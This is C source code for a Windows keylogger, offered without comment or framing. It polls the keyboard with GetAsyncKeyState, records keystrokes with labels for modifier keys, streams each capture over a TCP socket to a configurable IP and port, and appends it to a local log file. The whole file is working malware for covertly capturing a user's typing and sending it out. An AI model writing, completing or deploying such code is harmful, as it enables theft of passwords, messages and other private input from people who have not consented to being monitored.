#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define PORT 1455
#define IP "127.0.0.1"
#define PATH "C:\\OS\\output.txt"
#define DELAY 200
#define BUFFER_SIZE 255

INT APIENTRY WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nCmdShow)
{  
    WSADATA data;
    SOCKET sockfd = 0;
    SOCKADDR_IN sockfd_addr_in;
    FILE* file = NULL;
    CHAR c = 0;
    CHAR buffer[BUFFER_SIZE];
    BOOL reading = TRUE;

    ZeroMemory(&data, sizeof(data));
    ZeroMemory(&sockfd_addr_in, sizeof(sockfd_addr_in));
    ZeroMemory(buffer, sizeof(buffer));

    if(WSAStartup(MAKEWORD(2, 2), &data) != 0)
    {
        MessageBoxEx(NULL, "Error : Windowns socket can't be initialize !", "Initalize", MB_ICONERROR | MB_OK, 0);
        return EXIT_FAILURE;
    }
 
    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    if(sockfd == INVALID_SOCKET)
    {
        MessageBoxEx(NULL, "Error : Socket can't be created !", "Socket Creation", MB_ICONERROR | MB_OK, 0);
        return EXIT_FAILURE;
    }
    sockfd_addr_in.sin_family = AF_INET;
    sockfd_addr_in.sin_port = htons(PORT);
    sockfd_addr_in.sin_addr.s_addr = inet_addr(IP);

    if(connect(sockfd, (SOCKADDR*)& sockfd_addr_in, sizeof(sockfd_addr_in)) == SOCKET_ERROR)
    {
        MessageBoxEx(NULL, "Error : Socket can't be bind in the own context !", "Bind", MB_ICONERROR | MB_OK, 0);
        closesocket(sockfd);  
        WSACleanup();      
        return EXIT_FAILURE;
    }   

    file = fopen(PATH, "a+");

    if(file == NULL)
    {
        MessageBoxEx(NULL, "Error : Can't open file for write !", "File Open", MB_ICONERROR | MB_OK, 0);
        closesocket(sockfd);  
        WSACleanup();      
        return EXIT_FAILURE;
    }

    while(reading)
    {
        for(c = 32; c < 128; c++) 
        {
            if(GetAsyncKeyState(c))
            {
                switch((SHORT)c)
                {
                case VK_SPACE:
                    strcat(buffer, "  ");
                    break;
                case VK_LSHIFT:
                    strcat(buffer, " {VK_LSHIFT} ");
                    break;
                case VK_RSHIFT:
                    strcat(buffer, " {VK_RSHIFT} ");
                    break;
                case VK_LCONTROL:
                    strcat(buffer, " {VK_LCONTROL} ");
                    break;
                case VK_RCONTROL:
                    strcat(buffer, " {VK_RCONTROL} ");
                    break;
                case VK_LMENU:
                    strcat(buffer, " {VK_LMENU} ");
                    break;
                case VK_RMENU:
                    strcat(buffer, " {VK_RMENU} ");
                    break;
                case VK_ESCAPE:
                    strcat(buffer, " {VK_ESCAPE} ");
                    break;
                case VK_LBUTTON:
                    strcat(buffer, " {VK_LBUTTON} ");
                    break;
                case VK_RBUTTON:
                    strcat(buffer, " {VK_RBUTTON} ");
                    break;
                case VK_RETURN:
                    strcat(buffer, "\n");
                    break;  
                default:
                    strcat(buffer, &c);
                    break;
                } 

                if(send(sockfd, buffer, BUFFER_SIZE, 0) == SOCKET_ERROR)
                {
                    MessageBoxEx(NULL, "Error : Send data failure !", "Send", MB_ICONERROR | MB_OK, 0);
                    fclose(file);
                    closesocket(sockfd);  
                    WSACleanup();      
                    return EXIT_FAILURE;
                }
                else 
                {
                   fprintf(file, "%s", buffer);  
                }

                ZeroMemory(buffer, BUFFER_SIZE);
                Sleep(DELAY); 
                
            }
         } 
      }

    fclose(file);
    closesocket(sockfd);  
    WSACleanup();      
 

    return EXIT_SUCCESS;
}